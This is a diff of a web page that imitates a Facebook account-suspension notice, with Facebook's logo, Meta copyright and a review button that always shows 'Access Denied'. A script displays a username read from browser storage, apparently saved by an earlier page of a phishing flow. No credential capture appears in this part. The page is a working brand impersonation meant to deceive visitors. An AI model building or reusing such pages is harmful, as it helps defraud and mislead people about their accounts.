@@ -17,6 +17,13 @@
       padding: 12px 20px;
       font-size: 20px;
       font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .navbar img {
+      height: 25px;
     }
 
     .container {
@@ -94,6 +101,7 @@
       background-color: rgba(0,0,0,0.5);
       justify-content: center;
       align-items: center;
+      z-index: 999;
     }
 
     .modal-box {
@@ -133,8 +141,13 @@
 </head>
 <body>
 
-  <div class="navbar">Facebook</div>
+  <!-- Navbar with logo -->
+  <div class="navbar">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook">
+    Facebook
+  </div>
 
+  <!-- Main Container -->
   <div class="container">
     <h2>Your Account Has Been Suspended</h2>
 
@@ -142,15 +155,47 @@
       Username attempted: <span id="suspendedUser">Unknown</span>
     </div>
 
-    <p>Your account has been temporarily suspended due to activity that violates our <strong>Community Standards</strong>.</p>
+    <p>We’ve temporarily suspended your Facebook account due to activity that appears to go against our <strong>Community Standards</strong>.</p>
 
-    <p><strong>Violations may include:</strong></p>
+    <p><strong>Reasons may include:</strong></p>
     <ul>
-      <li>Sharing explicit or adult content that violates our policies</li>
-      <li>Graphic violence or disturbing imagery</li>
-      <li>Spamming, phishing, or impersonation behavior</li>
-      <li>Suspicious login patterns or bot-like activity</li>
+      <li>Posting explicit or harmful content</li>
+      <li>Using fake or impersonated identity</li>
+      <li>Abuse of features (spamming, automation)</li>
+      <li>Login attempts from unusual locations or patterns</li>
     </ul>
 
     <div class="notice">
-      Suspended accounts are reviewed carefully
+      If you believe this action was taken by mistake, you can request a review. However, for serious violations, access to the review system may be restricted.
+    </div>
+
+    <button class="review-button" onclick="openModal()">Request Review</button>
+  </div>
+
+  <div class="footer">© 2025 Meta Platforms, Inc.</div>
+
+  <!-- Modal -->
+  <div id="accessModal">
+    <div class="modal-box">
+      <h3>Access Denied</h3>
+      <p>This account is not eligible for review due to violation of critical policies. For assistance, contact our support team.</p>
+      <button class="modal-close" onclick="closeModal()">Close</button>
+    </div>
+  </div>
+
+  <!-- Script to Show Username + Modal -->
+  <script>
+    const user = localStorage.getItem("storedUsername") || "Unknown";
+    document.getElementById("suspendedUser").innerText = user;
+
+    function openModal() {
+      document.getElementById("accessModal").style.display = "flex";
+    }
+
+    function closeModal() {
+      document.getElementById("accessModal").style.display = "none";
+    }
+  </script>
+
+</body>
+</html>
